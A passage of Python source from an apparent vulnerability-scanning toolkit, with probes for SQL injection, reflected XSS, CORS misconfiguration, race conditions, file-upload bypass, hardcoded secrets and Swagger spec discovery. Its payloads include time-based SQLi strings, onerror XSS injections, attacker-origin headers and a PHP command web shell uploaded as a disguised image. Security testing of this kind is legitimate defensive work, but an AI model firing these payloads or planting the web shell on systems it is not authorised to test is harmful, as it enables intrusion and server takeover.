    param_list = param_list[:12]  # keep probe budget bounded

    if not param_list:
        return {
            "url": target_url,
            "vulnerable": False,
            "candidates": [],
            "error": "no parameters found — pass params= or a URL with ?id=1",
        }

    method = (method or "GET").upper()
    baseline = _http_probe(method, target_url, body=body, headers=headers, timeout=timeout)
    if baseline.get("error"):
        return {"url": target_url, "vulnerable": False, "candidates": [], "error": baseline["error"]}

    base_status = baseline.get("status")
    base_body = baseline.get("body") or ""
    base_len = len(base_body)
    base_ms = baseline.get("elapsed_ms") or 0

    candidates: List[dict] = []

    def _send_mutated(param: str, value: str) -> dict:
        if param in query_params or method == "GET":
            url = _mutate_url_param(target_url, param, value)
            return _http_probe(method, url, body=body, headers=headers, timeout=timeout + 8)
        mutated_body = _mutate_body_param(body, param, value, content_type)
        return _http_probe(method, target_url, body=mutated_body, headers=headers, timeout=timeout + 8)

    for param in param_list:
        signals: List[str] = []
        evidence_bits: List[str] = []

        # 1) Error-based quote
        err_resp = _send_mutated(param, "'")
        err_body = err_resp.get("body") or ""
        if _SQL_ERROR_RE.search(err_body):
            signals.append("sql_error")
            evidence_bits.append(f"DB error on quote: {_SQL_ERROR_RE.search(err_body).group(0)[:80]}")
        elif err_resp.get("status") and base_status and err_resp["status"] >= 500 and base_status < 500:
            signals.append("500_on_quote")
            evidence_bits.append(f"status {base_status}→{err_resp['status']} on '")

        # 2) Boolean differential (numeric-ish)
        true_resp = _send_mutated(param, "1 AND 1=1")
        false_resp = _send_mutated(param, "1 AND 1=2")
        t_body, f_body = true_resp.get("body") or "", false_resp.get("body") or ""
        if t_body and f_body and abs(len(t_body) - len(f_body)) > max(40, int(0.05 * max(len(t_body), 1))):
            if abs(len(t_body) - base_len) < abs(len(f_body) - base_len) or t_body != f_body:
                signals.append("boolean_diff")
                evidence_bits.append(
                    f"boolean len true={len(t_body)} false={len(f_body)} base={base_len}"
                )

        # 3) Time-based (short sleep — 4s threshold vs baseline)
        time_payloads = [
            "1 AND SLEEP(4)",
            "1;SELECT pg_sleep(4)--",
            "1 WAITFOR DELAY '0:0:4'--",
        ]
        for tp in time_payloads:
            tr = _send_mutated(param, tp)
            ms = tr.get("elapsed_ms") or 0
            if ms and base_ms is not None and ms >= max(3500, (base_ms or 0) + 3000):
                signals.append("time_delay")
                evidence_bits.append(f"time {ms}ms vs baseline {base_ms}ms with {tp[:40]}")
                break

        if signals:
            severity = "critical" if "sql_error" in signals or "time_delay" in signals else "high"
            title = f"SQLi candidate in '{param}' ({', '.join(signals)})"
            finding = {
                "title": title,
                "name": title,
                "url": target_url,
                "matched_at": target_url,
                "parameter": param,
                "severity": severity,
                "vuln_type": "sqli",
                "type": "sqli",
                "vulnerable": True,
                "confirmed": "sql_error" in signals or "time_delay" in signals,
                "signals": signals,
                "evidence": "; ".join(evidence_bits),
                "source": "probe_sqli",
            }
            candidates.append(finding)
            bridge.submit_vulnerability(
                host=parsed.hostname or target_url,
                title=title,
                severity=severity,
                source="probe_sqli",
                url=target_url,
                description=finding["evidence"],
                confidence="confirmed" if finding["confirmed"] else "high",
                tags=["sqli", "injection", "probe"] + signals,
            )

    if candidates:
        bridge.flush()

    return {
        "url": target_url,
        "method": method,
        "params_tested": param_list,
        "baseline_ms": base_ms,
        "baseline_status": base_status,
        "vulnerable": len(candidates) > 0,
        "candidates": candidates,
        "findings": candidates,
        "count": len(candidates),
        "next_step": (
            "Call sql_injection_test(target_url=..., param=<name>) on each candidate"
            if candidates else
            "No differential signals — try other endpoints or discover_parameters"
        ),
    }


def _classify_xss_contexts(body_text: str, canary: str) -> List[str]:
    """Classify how a canary reflects (HTML body, attribute, script, etc.)."""
    contexts: List[str] = []
    idx = 0
    while True:
        pos = body_text.find(canary, idx)
        if pos < 0:
            break
        before = body_text[max(0, pos - 120):pos]
        after = body_text[pos:min(len(body_text), pos + len(canary) + 40)]
        if re.search(r"<script[^>]*>[^<]*$", before, re.I | re.S):
            contexts.append("script_block")
        if re.search(r'=\s*"[^"]*$', before):
            contexts.append("attr_double")
        if re.search(r"=\s*'[^']*$", before):
            contexts.append("attr_single")
        if "<!--" in before and "-->" not in before.split("<!--")[-1]:
            contexts.append("html_comment")
        if re.search(r">[^<]*$", before) and "<" not in after[:len(canary) + 5]:
            contexts.append("html_body")
        if re.search(r"""['"][^'"]*$""", before) and "script" in before.lower():
            contexts.append("js_string")
        if not any(c in contexts for c in (
            "script_block", "attr_double", "attr_single", "html_body", "html_comment", "js_string"
        )):
            contexts.append("raw_reflection")
        idx = pos + len(canary)
    seen = set()
    out = []
    for c in contexts:
        if c not in seen:
            seen.add(c)
            out.append(c)
    return out or (["raw_reflection"] if canary in body_text else [])


def run_probe_xss_reflection(
    target_url: str,
    bridge: ASMBridge,
    method: str = "GET",
    body: str = "",
    params: str = "",
    headers_json: str = "{}",
    timeout: int = 20,
) -> dict:
    """Map XSS reflection contexts with a unique canary, then try context payloads.

    Returns reflections[] plus any execute-confirmed findings (marker-based).
    """
    try:
        headers = json.loads(headers_json) if headers_json else {}
    except json.JSONDecodeError:
        headers = {}

    canary = f"vanguardXSS{os.urandom(3).hex()}"
    parsed = urlparse(target_url)
    query_params = [k for k, _ in parse_qsl(parsed.query, keep_blank_values=True)]
    body_params = [k for k, _ in parse_qsl(body or "", keep_blank_values=True)]

    if params.strip():
        param_list = [p.strip() for p in params.split(",") if p.strip()]
    else:
        param_list = list(dict.fromkeys(query_params + body_params))
        # Common reflection sinks if URL has no params yet
        if not param_list:
            param_list = ["q", "search", "query", "name", "callback", "redirect", "url", "next", "return", "msg", "error"]

    param_list = param_list[:15]
    method = (method or "GET").upper()
    content_type = headers.get("Content-Type") or headers.get("content-type") or ""
    if body and not content_type and method != "GET":
        content_type = "application/x-www-form-urlencoded"
        headers["Content-Type"] = content_type

    reflections: List[dict] = []
    findings: List[dict] = []

    def _send(param: str, value: str) -> dict:
        if method == "GET" or param in query_params or not body:
            url = _mutate_url_param(target_url, param, value)
            return _http_probe("GET" if method == "GET" else method, url, body=body if method != "GET" else "", headers=headers, timeout=timeout)
        mutated = _mutate_body_param(body, param, value, content_type)
        return _http_probe(method, target_url, body=mutated, headers=headers, timeout=timeout)

    # Context-appropriate payloads using window marker (no alert dependency)
    context_payloads = {
        "html_body": f"<img src=x id={canary} onerror=window.__vanguard_xss=1>",
        "attr_double": f'"><img src=x id={canary} onerror=window.__vanguard_xss=1>',
        "attr_single": f"'><img src=x id={canary} onerror=window.__vanguard_xss=1>",
        "script_block": f"</script><img src=x id={canary} onerror=window.__vanguard_xss=1>",
        "js_string": f"'-window.__vanguard_xss=1-'",
        "html_comment": f"--><img src=x id={canary} onerror=window.__vanguard_xss=1><!--",
        "encoded_only": canary,  # reflection only — not executable yet
    }

    for param in param_list:
        resp = _send(param, canary)
        body_text = resp.get("body") or ""
        if canary not in body_text:
            # Encoded reflection still useful signal
            if canary.replace("<", "&lt;") in body_text or canary in body_text.replace("\\u003c", "<"):
                contexts = ["encoded_only"]
            else:
                continue
        else:
            contexts = _classify_xss_contexts(body_text, canary)

        reflection = {
            "parameter": param,
            "canary": canary,
            "contexts": contexts,
            "status": resp.get("status"),
            "reflected": True,
        }
        reflections.append(reflection)

        # Attempt one context-matched payload via HTTP reflection check
        for ctx in contexts:
            payload = context_payloads.get(ctx) or context_payloads["html_body"]
            if payload == canary:
                continue
            pr = _send(param, payload)
            pb = pr.get("body") or ""
            # Unescaped executable sink markers
            if "onerror=window.__vanguard_xss" in pb or "window.__vanguard_xss=1" in pb:
                if "<img" in pb or "onerror" in pb:
                    title = f"Reflected XSS candidate in '{param}' ({ctx})"
                    finding = {
                        "title": title,
                        "name": title,
                        "url": target_url,
                        "matched_at": target_url,
                        "parameter": param,
                        "severity": "high",
                        "vuln_type": "xss",
                        "type": "xss",
                        "vulnerable": True,
                        "confirmed": False,
                        "context": ctx,
                        "payload": payload,
                        "evidence": f"Unescaped payload reflected in {ctx} context",
                        "source": "probe_xss",
                        "next_step": "Call test_dom_xss or xss_test to confirm execution",
                    }
                    findings.append(finding)
                    bridge.submit_vulnerability(
                        host=parsed.hostname or target_url,
                        title=title,
                        severity="high",
                        source="probe_xss",
                        url=target_url,
                        description=finding["evidence"] + f"\nPayload: {payload}",
                        confidence="high",
                        tags=["xss", "reflected-xss", "probe", ctx],
                    )
                    break

    if findings:
        bridge.flush()

    return {
        "url": target_url,
        "canary": canary,
        "params_tested": param_list,
        "reflections": reflections,
        "reflection_count": len(reflections),
        "vulnerable": len(findings) > 0,
        "findings": findings,
        "candidates": findings,
        "count": len(findings),
        "next_step": (
            "Confirm with test_dom_xss(target_url, params='...') or xss_test; "
            "then confirm_vulnerability_poc"
            if (reflections or findings) else
            "No reflections — try discover_parameters, crawl forms, or DOM sinks via test_dom_xss"
        ),
    }


# =============================================================================
# CORS policy tester
# =============================================================================

def run_cors_test(target_url: str, bridge, timeout: int = 60) -> dict:
    """Test CORS policy with attacker-controlled Origin headers."""
    from urllib.parse import urlparse
    import json as _json

    parsed = urlparse(target_url)
    domain = parsed.netloc or target_url

    # Craft origin variants that should NOT be trusted
    test_origins = [
        "https://evil.com",
        "null",
        f"https://evil.{domain}",
        f"https://{domain}.attacker.com",
        f"https://not{domain}",
        f"https://{domain}evil.com",
    ]

    issues = []
    try:
        import httpx
        with httpx.Client(timeout=timeout, follow_redirects=True) as client:
            for origin in test_origins:
                try:
                    resp = client.get(target_url, headers={"Origin": origin})
                    acao = resp.headers.get("access-control-allow-origin", "")
                    acac = resp.headers.get("access-control-allow-credentials", "").lower()

                    if not acao:
                        continue

                    vuln = None
                    if acao == "*":
                        vuln = "wildcard_acao"
                    elif acao == origin:
                        vuln = "reflected_origin"
                    elif acao == "null" and origin == "null":
                        vuln = "null_origin_allowed"

                    if vuln:
                        exploitable = acac == "true"
                        severity = "high" if exploitable else "medium"
                        issues.append({
                            "origin_sent": origin,
                            "acao_response": acao,
                            "acac": acac,
                            "issue": vuln,
                            "exploitable": exploitable,
                            "severity": severity,
                            "endpoint": target_url,
                        })
                        if exploitable and bridge:
                            bridge.submit_finding(
                                host=parsed.netloc,
                                title=f"CORS Misconfiguration — {vuln}",
                                description=(
                                    f"Origin '{origin}' is reflected in ACAO with "
                                    f"Access-Control-Allow-Credentials: {acac}"
                                ),
                                severity=severity,
                                confidence="confirmed",
                                tags=["cors", "misconfiguration", "information-disclosure"],
                                raw_data={"origin": origin, "acao": acao, "acac": acac},
                            )
                except Exception:
                    continue
    except ImportError:
        return {"error": "httpx not available for CORS testing"}

    if bridge:
        bridge.flush()

    return {
        "target": target_url,
        "issues": issues,
        "count": len(issues),
        "exploitable_count": sum(1 for i in issues if i.get("exploitable")),
    }


# =============================================================================
# Race condition tester
# =============================================================================

def run_race_condition_test(
    url: str,
    method: str,
    body_json: str,
    num_concurrent: int,
    bridge,
    timeout: int = 30,
) -> dict:
    """Send N concurrent requests to a single endpoint to detect race conditions."""
    import threading
    import time as _time
    import json as _json

    num_concurrent = min(int(num_concurrent or 10), 20)
    results = []
    errors = []
    lock = threading.Lock()
    barrier = threading.Barrier(num_concurrent)

    def send_one():
        try:
            barrier.wait(timeout=5)  # all threads fire at the same instant
        except threading.BrokenBarrierError:
            return

        try:
            import httpx
            headers = {"Content-Type": "application/json"}
            body_bytes = body_json.encode() if body_json and body_json.strip() else None
            with httpx.Client(timeout=timeout) as client:
                t0 = _time.time()
                resp = client.request(method.upper(), url, content=body_bytes, headers=headers)
                elapsed = _time.time() - t0
                with lock:
                    results.append({
                        "status": resp.status_code,
                        "elapsed_ms": round(elapsed * 1000),
                        "body_sample": resp.text[:300],
                    })
        except Exception as e:
            with lock:
                errors.append(str(e))

    threads = [threading.Thread(target=send_one) for _ in range(num_concurrent)]
    for t in threads:
        t.start()
    for t in threads:
        t.join(timeout=timeout + 10)

    statuses = [r["status"] for r in results]
    bodies = [r["body_sample"] for r in results]
    unique_statuses = list(set(statuses))
    unique_bodies = len(set(bodies))

    potential_race = (
        len(unique_statuses) > 1
        or unique_bodies > 1
        or (statuses.count(200) > 1 and "already" not in " ".join(bodies).lower())
    )

    return {
        "url": url,
        "method": method,
        "concurrent_requests_sent": num_concurrent,
        "responses_received": len(results),
        "unique_status_codes": unique_statuses,
        "unique_body_variants": unique_bodies,
        "potential_race_condition": potential_race,
        "responses": results,
        "errors": errors[:5],
        "note": "Potential race if multiple 200s with different bodies or multiple accepted states",
    }


# =============================================================================
# File upload tester
# =============================================================================

def run_file_upload_test(upload_url: str, bridge, timeout: int = 120) -> dict:
    """Test file upload endpoint with bypass payloads."""
    import io as _io
    import json as _json
    from urllib.parse import urlparse

    # First run nuclei file-upload templates
    nuclei_hits = run_nuclei(
        upload_url,
        bridge,
        templates="tags=file-upload,upload,unrestricted-file-upload,file-upload-bypass",
        timeout=60,
    )

    results = []

    # PHP polyglot: valid JPEG magic bytes + PHP code
    jpeg_magic = b"\xff\xd8\xff\xe0\x00\x10JFIF\x00"
    php_payload = b"<?php system($_GET['cmd']); ?>"

    test_cases = [
        ("shell.php", php_payload, "application/x-php", "bare_php"),
        ("shell.php.jpg", php_payload, "image/jpeg", "double_extension_php_jpg"),
        ("shell.phtml", php_payload, "image/jpeg", "phtml_extension"),
        ("shell.php5", php_payload, "image/jpeg", "php5_extension"),
        ("shell.shtml", php_payload, "text/html", "shtml_extension"),
        ("shell.jpg", jpeg_magic + php_payload, "image/jpeg", "polyglot_jpeg_php"),
        ("../../../shell.txt", b"path_traversal_test", "text/plain", "path_traversal_filename"),
        ("shell.svg", b'<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.domain)</script></svg>', "image/svg+xml", "svg_xss"),
        ("shell.html", b"<script>alert(document.domain)</script>", "text/html", "html_xss"),
        ("shell.aspx", b"<%@ Page Language=\"C#\" %><%Response.Write(\"ASPX_RCE\");%>", "application/octet-stream", "aspx_extension"),
    ]

    try:
        import httpx
        with httpx.Client(timeout=timeout, follow_redirects=True) as client:
            for filename, content, content_type, test_name in test_cases:
                try:
                    files = {"file": (filename, _io.BytesIO(content), content_type)}
                    resp = client.post(upload_url, files=files)
                    body = resp.text[:500]
                    interesting = (
                        resp.status_code in (200, 201, 202, 204)
                        and ("success" in body.lower() or "upload" in body.lower()
                             or "file" in body.lower() or resp.status_code == 200)
                        and "error" not in body.lower()
                        and "invalid" not in body.lower()
                    )
                    entry = {
                        "test": test_name,
                        "filename": filename,
                        "content_type_sent": content_type,
                        "status": resp.status_code,
                        "response_sample": body,
                        "accepted": interesting,
                    }
                    results.append(entry)
                    if interesting and bridge:
                        parsed = urlparse(upload_url)
                        bridge.submit_finding(
                            host=parsed.netloc,
                            title=f"File Upload Bypass — {test_name}",
                            description=f"Server accepted {filename} ({content_type}): HTTP {resp.status_code}",
                            severity="high",
                            confidence="potential",
                            tags=["file-upload", "upload-bypass", test_name],
                            raw_data={"filename": filename, "status": resp.status_code, "response": body},
                        )
                except Exception as e:
                    results.append({"test": test_name, "error": str(e)})
    except ImportError:
        return {"error": "httpx not available for file upload testing", "nuclei_findings": len(nuclei_hits)}

    if bridge:
        bridge.flush()

    return {
        "upload_url": upload_url,
        "nuclei_findings": len(nuclei_hits),
        "upload_bypass_tests": results,
        "accepted_count": sum(1 for r in results if r.get("accepted")),
        "potentially_vulnerable": len(nuclei_hits) > 0 or any(r.get("accepted") for r in results),
    }


# =========================================================================
# SAST (Static Application Security Testing) scanners
# =========================================================================

def run_sast_secrets(source_dir: str, bridge: Optional[ASMBridge] = None, timeout: int = 300) -> Dict[str, Any]:
    """Scan source tree for hardcoded secrets using Gitleaks (falls back to regex grep)."""
    source_dir = os.path.realpath(source_dir)
    if not os.path.isdir(source_dir):
        return {"error": f"Not a directory: {source_dir}"}

    findings: List[Dict] = []

    # --- Gitleaks (preferred) ---
    if _tool_available("gitleaks"):
        with tempfile.NamedTemporaryFile(suffix=".json", delete=False) as tf:
            report_path = tf.name
        try:
            _run(
                ["gitleaks", "detect", "--source", source_dir,
                 "--report-format", "json", "--report-path", report_path,
                 "--no-git", "--exit-code", "0"],
                timeout=timeout,
            )
            leaks = json.loads(open(report_path).read()) if os.path.exists(report_path) else []
            for leak in (leaks or []):
                findings.append({
                    "tool": "gitleaks",
                    "rule": leak.get("RuleID", "unknown"),
                    "file": leak.get("File", ""),
                    "line": leak.get("StartLine", 0),
                    "secret_snippet": (leak.get("Secret") or "")[:60] + "…",
                    "description": leak.get("Description", ""),
                })
            logger.info("gitleaks: %d findings in %s", len(findings), source_dir)
        except Exception as exc:
            logger.warning("gitleaks run error: %s", exc)
        finally:
            if os.path.exists(report_path):
                os.unlink(report_path)

    # --- Fallback regex grep for common patterns ---
    _REGEX_PATTERNS = {
        "aws_access_key": r"AKIA[0-9A-Z]{16}",
        "generic_api_key": r"(?i)(api[_-]?key|token)['\"]?\s*[:=]\s*['\"]([A-Za-z0-9_\-]{20,})",
        "private_key_header": r"-----BEGIN (RSA |EC |OPENSSH |DSA )?PRIVATE KEY-----",
        "stripe_key": r"sk_(live|test)_[A-Za-z0-9]{24,}",
        "anthropic_key": r"sk-ant-[A-Za-z0-9\-_]{40,}",
        "openai_key": r"sk-[A-Za-z0-9]{40,}",
        "github_pat": r"gh[pousr]_[A-Za-z0-9]{36,}",
        "db_password": r"(?i)(password|passwd|pwd)\s*[:=]\s*['\"]([^'\"]{6,})",
        "db_url": r"(postgres|mysql|mongodb|redis)://[^@\s]+:[^@\s]+@",
    }

    exclude_dirs = {".git", "node_modules", "vendor", "__pycache__", ".venv", "venv"}
    for root, dirs, files in os.walk(source_dir):
        dirs[:] = [d for d in dirs if d not in exclude_dirs]
        for fname in files:
            if not any(fname.endswith(ext) for ext in (
                ".py", ".js", ".ts", ".go", ".rb", ".java", ".php",
                ".env", ".yml", ".yaml", ".json", ".xml", ".config",
                ".conf", ".ini", ".toml", ".sh", ".bash",
            )):
                continue
            fpath = os.path.join(root, fname)
            try:
                content = open(fpath, "r", errors="ignore").read()
            except Exception:
                continue
            for rule_name, pattern in _REGEX_PATTERNS.items():
                for m in re.finditer(pattern, content):
                    lineno = content[:m.start()].count("\n") + 1
                    # Skip obvious examples / test values
                    snippet = m.group(0)
                    if any(word in snippet.lower() for word in ("example", "your_key", "replace", "xxx", "yyy", "test_key")):
                        continue
                    # Avoid duplicate gitleaks findings
                    rel_path = os.path.relpath(fpath, source_dir)
                    key = f"{rel_path}:{lineno}:{rule_name}"
                    if not any(
                        f.get("file", "").endswith(rel_path) and f.get("line") == lineno
                        for f in findings
                    ):
                        findings.append({
                            "tool": "regex",
                            "rule": rule_name,
                            "file": rel_path,
                            "line": lineno,
                            "secret_snippet": snippet[:60] + ("…" if len(snippet) > 60 else ""),
                        })

    if bridge and findings:
        for f in findings[:50]:
            bridge.submit_finding(
                host=source_dir,
                title=f"Hardcoded Secret — {f['rule']}",
                description=f"Found in {f['file']}:{f.get('line', '?')}",
                severity="high",
                confidence="potential",
                tags=["sast", "secrets", f["rule"]],
                raw_data=f,
            )
        bridge.flush()

    return {
        "source_dir": source_dir,
        "findings": findings,
        "count": len(findings),
        "tool": "gitleaks+regex",
    }


def run_semgrep(
    source_dir: str,
    ruleset: str = "auto",
    timeout: int = 600,
) -> Dict[str, Any]:
    """Run semgrep static analysis on source_dir with specified ruleset."""
    source_dir = os.path.realpath(source_dir)
    if not os.path.isdir(source_dir):
        return {"error": f"Not a directory: {source_dir}"}
    if not _tool_available("semgrep"):
        return {
            "error": "semgrep not installed. Install with: pip install semgrep",
            "install_hint": "pip install semgrep",
        }

    cmd = [
        "semgrep", "--config", ruleset,
        "--json", "--no-git-ignore",
        "--max-memory", "1024",
        source_dir,
    ]
    try:
        result = _run(cmd, timeout=timeout)
        output = result.stdout or result.stderr or "{}"
        data = json.loads(output)
    except json.JSONDecodeError:
        data = {"raw_output": (result.stdout or "")[:5000]}
    except Exception as exc:
        return {"error": str(exc)}

    results = data.get("results", [])
    simplified = [
        {
            "rule_id": r.get("check_id", ""),
            "message": r.get("extra", {}).get("message", "")[:300],
            "severity": r.get("extra", {}).get("severity", "INFO").lower(),
            "file": r.get("path", ""),
            "lines": r.get("start", {}).get("line", 0),
            "snippet": r.get("extra", {}).get("lines", "")[:200],
        }
        for r in results[:100]
    ]
    logger.info("semgrep: %d findings in %s (ruleset: %s)", len(simplified), source_dir, ruleset)
    return {
        "source_dir": source_dir,
        "ruleset": ruleset,
        "findings": simplified,
        "count": len(simplified),
        "errors": [e.get("message", "") for e in data.get("errors", [])[:5]],
    }


def grep_source(
    pattern: str,
    source_dir: str,
    file_extensions: Optional[List[str]] = None,
    case_sensitive: bool = True,
    max_results: int = 50,
    timeout: int = 60,
) -> Dict[str, Any]:
    """Regex grep across source code files — returns file, line, and matching snippet."""
    source_dir = os.path.realpath(source_dir)
    if not os.path.isdir(source_dir):
        return {"error": f"Not a directory: {source_dir}"}

    extensions = file_extensions or [
        ".py", ".js", ".ts", ".jsx", ".tsx", ".go", ".rb", ".java",
        ".php", ".cs", ".cpp", ".c", ".h", ".rs", ".swift", ".kt",
        ".yml", ".yaml", ".json", ".xml", ".env", ".config", ".conf",
    ]

    exclude_dirs = {".git", "node_modules", "vendor", "__pycache__", ".venv", "venv", "dist", "build"}
    matches: List[Dict] = []

    try:
        flags = 0 if case_sensitive else re.IGNORECASE
        compiled = re.compile(pattern, flags)
    except re.error as exc:
        return {"error": f"Invalid regex: {exc}"}

    for root, dirs, files in os.walk(source_dir):
        dirs[:] = [d for d in dirs if d not in exclude_dirs]
        for fname in files:
            if not any(fname.endswith(ext) for ext in extensions):
                continue
            fpath = os.path.join(root, fname)
            try:
                with open(fpath, "r", errors="ignore") as fh:
                    for lineno, line in enumerate(fh, start=1):
                        if compiled.search(line):
                            matches.append({
                                "file": os.path.relpath(fpath, source_dir),
                                "line": lineno,
                                "content": line.rstrip()[:300],
                            })
                            if len(matches) >= max_results:
                                return {
                                    "pattern": pattern,
                                    "matches": matches,
                                    "count": len(matches),
                                    "truncated": True,
                                }
            except Exception:
                continue

    return {
        "pattern": pattern,
        "matches": matches,
        "count": len(matches),
        "truncated": False,
    }


# =========================================================================
# Swagger / OpenAPI Discovery & Testing (AutoSwagger-style)
# =========================================================================

# Common spec paths probed during bruteforce discovery (mirrors autoswagger's list)
_SWAGGER_SPEC_PATHS: List[str] = [
    "/swagger.json", "/swagger.yaml", "/swagger.yml",
    "/openapi.json", "/openapi.yaml", "/openapi.yml",
    "/api/swagger.json", "/api/openapi.json", "/api/swagger.yaml",
    "/api-docs", "/api-docs/swagger.json", "/api-docs/v1", "/api-docs/v2",
    "/v2/api-docs", "/v3/api-docs", "/v1/api-docs",
    "/docs/openapi.json", "/docs/swagger.json",
    "/spec", "/spec.json", "/spec.yaml", "/spec.yml",
    "/swagger/v1/swagger.json", "/swagger/v2/swagger.json",
    "/swagger-ui.json", "/swagger-ui/swagger.json",
    "/assets/swagger.json", "/static/swagger.json",
    "/.well-known/openapi.json",
    "/rest/swagger.json", "/rest/api-docs",
    "/backend/swagger.json", "/internal/swagger.json",
    "/api/v1/openapi.json", "/api/v2/openapi.json", "/api/v3/openapi.json",
]

# Swagger UI page paths used to scrape the embedded spec URL
_SWAGGER_UI_PATHS: List[str] = [
    "/swagger-ui", "/swagger-ui/", "/swagger-ui.html",
    "/swagger", "/swagger/", "/docs", "/docs/",
    "/api/docs", "/api/swagger-ui", "/api/swagger",
    "/redoc", "/redoc/", "/api-docs", "/openapi",
]

_SWAGGER_UI_SPEC_RE = re.compile(
    r'(?:url|spec)["\']?\s*:\s*["\']([^"\']+\.(?:json|yaml|yml)[^"\']*)["\']',
    re.IGNORECASE,
)
_SWAGGER_INITIALIZER_RE = re.compile(
    r'SwaggerUIBundle\s*\(\s*\{[^}]*url\s*:\s*["\']([^"\']+)["\']',
    re.IGNORECASE | re.DOTALL,
)

# Common secret regexes (TruffleHog-style, adapted for response bodies)
_SECRET_PATTERNS: Dict[str, re.Pattern] = {
    "aws_key":         re.compile(r'AKIA[0-9A-Z]{16}'),
    "aws_secret":      re.compile(r'(?i)aws.{0,20}secret.{0,10}["\']([A-Za-z0-9/+=]{40})["\']'),
    "generic_api_key": re.compile(r'(?i)(?:api[_-]?key|apikey|api_secret|client_secret)["\']?\s*[=:]\s*["\']([A-Za-z0-9_\-]{20,})["\']'),
    "bearer_token":    re.compile(r'(?i)bearer\s+([A-Za-z0-9\-_\.]{20,})'),
    "private_key":     re.compile(r'-----BEGIN (?:RSA |EC )?PRIVATE KEY-----'),
    "github_token":    re.compile(r'ghp_[A-Za-z0-9]{36}|github_pat_[A-Za-z0-9_]{82}'),
    "jwt":             re.compile(r'eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}'),
    "database_url":    re.compile(r'(?i)(?:postgres|mysql|mongodb|redis)://[^\s"\'<>]+'),
    "slack_token":     re.compile(r'xox[baprs]-[0-9A-Za-z\-]{10,}'),
    "stripe_key":      re.compile(r'(?:sk|pk)_(?:live|test)_[0-9a-zA-Z]{24,}'),
}

# Simple PII patterns (Presidio-style lightweight equivalents)
_PII_PATTERNS: Dict[str, re.Pattern] = {
    "email":       re.compile(r'\b[A-Za-z0-9._%+\-]+@[A-Za-z0-9.\-]+\.[A-Z|a-z]{2,}\b'),
    "us_phone":    re.compile(r'\b(?:\+1[-.\s]?)?\(?\d{3}\)?[-.\s]?\d{3}[-.\s]?\d{4}\b'),
    "ssn":         re.compile(r'\b\d{3}-\d{2}-\d{4}\b'),
    "credit_card": re.compile(r'\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13}|6011[0-9]{12})\b'),
    "ip_internal": re.compile(r'\b(?:10\.|172\.(?:1[6-9]|2[0-9]|3[01])\.|192\.168\.)\d+\.\d+\b'),
}


def _parse_spec_endpoints(spec: Dict[str, Any]) -> List[Dict[str, str]]:
    """Extract paths and methods from a parsed OpenAPI/Swagger spec dict."""
    endpoints: List[Dict[str, str]] = []
    paths = spec.get("paths") or {}
    # OpenAPI 3.x has servers[], Swagger 2.x has basePath
    base_path = spec.get("basePath", "")
    for path, methods in paths.items():
        if not isinstance(methods, dict):
            continue
        for method in ("get", "post", "put", "patch", "delete", "head", "options"):
            if method in methods:
                endpoints.append({
                    "path": path,
                    "method": method.upper(),
                    "full_path": base_path + path if base_path and not path.startswith(base_path) else path,
                    "operation_id": methods[method].get("operationId", ""),
                    "summary": methods[method].get("summary", ""),
                    "tags": ", ".join(methods[method].get("tags", [])),
                })
    return endpoints


def _scan_response_for_pii_and_secrets(
    text: str,
) -> Dict[str, List[str]]:
    """Scan a response body for PII and secret patterns. Returns matches per category."""
    findings: Dict[str, List[str]] = {}
    for name, pattern in _SECRET_PATTERNS.items():
        hits = pattern.findall(text)
        if hits:
            findings[f"secret:{name}"] = list(set(str(h) for h in hits))[:5]
    for name, pattern in _PII_PATTERNS.items():
        hits = pattern.findall(text)
        if hits:
            findings[f"pii:{name}"] = list(set(str(h) for h in hits))[:5]
    return findings


def run_swagger_spec_discovery(
    target_url: str,
    bridge: ASMBridge,
    timeout: int = 60,
) -> Dict[str, Any]:
    """
    Multi-phase Swagger/OpenAPI spec discovery (AutoSwagger-style).

    Phase 1: If target_url looks like a spec file, parse it directly.
    Phase 2: Probe known Swagger UI paths and scrape embedded spec URLs from HTML/JS.
    Phase 3: Bruteforce common spec paths on the target origin.

    Returns: dict with discovered spec URLs, parsed endpoint list, and metadata.
    """
    import httpx

    parsed_target = urlparse(target_url)
    base_origin = f"{parsed_target.scheme}://{parsed_target.netloc}"

    discovered_specs: List[Dict[str, Any]] = []
    candidate_spec_urls: List[str] = []
    all_endpoints: List[Dict[str, str]] = []

    headers = {
        "User-Agent": "AegisVanguard-SwaggerProbe/1.0",
        "Accept": "application/json, application/yaml, text/yaml, */*",
    }

    def _try_fetch_spec(url: str, client: "httpx.Client") -> Optional[Dict[str, Any]]:
        """Attempt to fetch and parse a URL as an OpenAPI/Swagger spec. Returns parsed dict or None."""
        try:
            resp = client.get(url, timeout=15, follow_redirects=True)
            if resp.status_code not in (200, 206):
                return None
            ct = resp.headers.get("content-type", "").lower()
            text = resp.text.strip()
            if not text:
                return None
            # Try JSON first
            if "json" in ct or text.startswith("{") or text.startswith("["):
                try:
                    data = json.loads(text)
                    if isinstance(data, dict) and (
                        "swagger" in data or "openapi" in data or "paths" in data
                    ):
                        return data
                except json.JSONDecodeError:
                    pass
            # Try YAML
            if "yaml" in ct or url.endswith((".yaml", ".yml")):
                try:
                    import yaml  # pyyaml is in requirements.txt
                    data = yaml.safe_load(text)
                    if isinstance(data, dict) and (
                        "swagger" in data or "openapi" in data or "paths" in data
                    ):
                        return data
                except Exception:
                    pass
        except Exception:
            pass
        return None

    def _scrape_swagger_ui_for_spec_url(url: str, client: "httpx.Client") -> Optional[str]:
        """Fetch a Swagger UI page and extract the embedded spec URL."""
        try:
            resp = client.get(url, timeout=15, follow_redirects=True)
            if resp.status_code != 200:
                return None
            text = resp.text
            # Look for url: '/spec.json' or initializer patterns
            for pattern in (_SWAGGER_UI_SPEC_RE, _SWAGGER_INITIALIZER_RE):
                m = pattern.search(text)
                if m:
                    spec_path = m.group(1)
                    if spec_path.startswith("http"):
                        return spec_path
                    return urljoin(base_origin, spec_path)
            # Fallback: look for common spec href patterns in HTML
            href_re = re.search(r'href=["\']([^"\']+(?:openapi|swagger)\.(?:json|yaml))["\']', text, re.IGNORECASE)
            if href_re:
                path = href_re.group(1)
                return path if path.startswith("http") else urljoin(base_origin, path)
        except Exception:
            pass
        return None

    with httpx.Client(headers=headers, verify=False) as client:
        # Phase 1: Direct spec URL if target looks like a spec file
        lower_path = parsed_target.path.lower()
        if any(lower_path.endswith(ext) for ext in (".json", ".yaml", ".yml")):
